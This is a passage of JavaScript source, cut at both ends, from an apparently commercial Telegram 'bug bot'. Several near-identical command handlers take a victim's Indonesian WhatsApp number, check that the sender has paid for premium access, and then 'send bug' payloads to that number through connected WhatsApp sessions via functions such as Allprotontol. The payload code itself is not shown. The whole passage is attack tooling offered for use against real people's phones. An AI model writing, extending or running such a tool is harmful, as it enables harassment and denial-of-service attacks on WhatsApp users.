[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontol(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Protokol7\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontol(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Protokol8\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontol(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/AllProtokol\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontol(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//



//AKHIR CASE BUG DELAY STUNT//



//=======CASE BUG=========//
bot.onText(/\/MipaaXinvisX\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontolhourss(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Xhard\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontolhourss(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Protokol6X\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
